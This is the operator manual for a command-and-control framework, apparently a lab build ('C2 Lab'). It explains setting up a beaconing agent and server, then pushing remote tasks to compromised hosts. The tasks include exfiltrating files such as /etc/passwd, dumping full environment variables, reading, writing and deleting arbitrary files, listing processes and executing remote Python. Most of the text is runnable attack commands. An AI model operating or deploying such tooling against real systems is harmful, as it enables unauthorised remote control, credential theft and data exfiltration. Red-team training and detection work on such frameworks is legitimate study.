C2 Lab — Operator Reference

# First-Time Setup

## 1. Generate the shared encryption key

The agent and server must share a Fernet key. Generate one and place it
in config/shared_key:

    python3 -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())" \
        > config/shared_key
    chmod 600 config/shared_key

Copy config/shared_key to the agent host (same path relative to the repo).
Alternatively export it as an environment variable on both hosts:

    export C2_SHARED_KEY=<key>

## 2. Generate the agent authentication key

    python3 -m server.create_user --gen-agent-key

This writes a random hex key to config/agent_key (mode 600) and prints it.
Copy config/agent_key to the agent host, or export:

    export C2_AGENT_KEY=<key>

## 3. Create an operator account

    python3 -m server.create_user                    # creates 'admin'
    python3 -m server.create_user --username alice   # creates 'alice'

Password must be at least 12 characters.

## 4. Start the server

    python3 -m server.app

Server listens on 0.0.0.0:5000.

## 5. Start the agent

    python3 -m agent.agent

The agent beacons every 10–30 seconds and prints its UUID on startup.

---

# Operator CLI

## Login / logout

    python3 -m controller.operator login
    python3 -m controller.operator logout

Credentials are exchanged for a signed token stored in
controller/.operator_token (mode 600). Tokens expire after 8 hours.
Set C2_SECRET_KEY on the server to make tokens survive restarts.

## List registered agents

    python3 -m controller.operator agents

Sample output:

    3f4a1b2c-...
      user:      alice
      host:      workstation.local
      os:        Darwin
      status:    online
      last_seen: 1711800000.0

## Push a task

    python3 -m controller.operator exec <AGENT_ID> <TASK_TYPE> [--args '<JSON>']

Replace <AGENT_ID> with the UUID from the agents command.

---

# Web Dashboard

Open https://localhost:5000 in a browser. Log in with your operator
credentials. The dashboard auto-refreshes every 5 seconds.

- Sidebar: all registered agents with online/offline status
- Task Dispatch: select agent, choose task type, fill in args, click Push Task
- Task Queue: live view of queued → delivered → completed tasks per agent
- Clear button: removes all tasks for an agent

---

# Task Reference

## Filesystem

### list_directory — list files in a directory

    python3 -m controller.operator exec <ID> list_directory --args '{"path":"/tmp"}'

### sample_file — read the first 5 lines of a file

    python3 -m controller.operator exec <ID> sample_file --args '{"path":"/etc/hosts"}'

### read_file — read a file (1 MB max)

    python3 -m controller.operator exec <ID> read_file --args '{"path":"/etc/hostname"}'

### write_file — write content to a file

    python3 -m controller.operator exec <ID> write_file \
        --args '{"path":"/tmp/out.txt","content":"hello"}'

### delete_file — delete a file (agent files are protected)

    python3 -m controller.operator exec <ID> delete_file --args '{"path":"/tmp/out.txt"}'

### exfil_file — base64-encode and upload a file to the server (5 MB max)

    python3 -m controller.operator exec <ID> exfil_file --args '{"path":"/etc/passwd"}'

Exfiltrated files are saved to exfil/<agent_id>_<filename>.

## Sysinfo

### get_sysinfo — OS, kernel, architecture, Python version

    python3 -m controller.operator exec <ID> get_sysinfo

### get_env — full environment variable dump

    python3 -m controller.operator exec <ID> get_env

### get_uptime — boot time and uptime

    python3 -m controller.operator exec <ID> get_uptime

### get_processes — running process list (default 50, max 500)

    python3 -m controller.operator exec <ID> get_processes
    python3 -m controller.operator exec <ID> get_processes --args '{"limit":100}'

## Execution

### python_exec — run Python in a sandboxed subprocess (5-second default timeout)

    python3 -m controller.operator exec <ID> python_exec \
        --args '{"code":"result = 2 + 2"}'

    python3 -m controller.operator exec <ID> python_exec \
        --args '{"code":"print(\"hello\")", "timeout": 10}'

The subprocess has a restricted builtins set. Assign to `result` to
surface a return value. stdout and stderr are captured and returned.

---

# Credential Management

    python3 -m server.create_user                        # create / update 'admin'
    python3 -m server.create_user --username <name>      # create / update named user
    python3 -m server.create_user --delete <name>        # delete a user
    python3 -m server.create_user --list                 # list all users and last login
    python3 -m server.create_user --gen-agent-key        # rotate the agent key

---

# System Limits

| Limit                        | Value             |
|------------------------------|-------------------|
| Max queued tasks per agent   | 100               |
| Max exfil file size          | 5 MB              |
| read_file max size           | 1 MB              |
| python_exec default timeout  | 5 seconds         |
| Login rate limit             | 10 attempts / 60s |
| Operator token TTL           | 8 hours           |
| Agent timeout (online → offline) | 60 seconds    |
| Exfil directory              | exfil/            |
| Transport encryption         | Fernet (AES-128-CBC + HMAC-SHA256) |
| Password hashing             | pbkdf2:sha256:600000 |
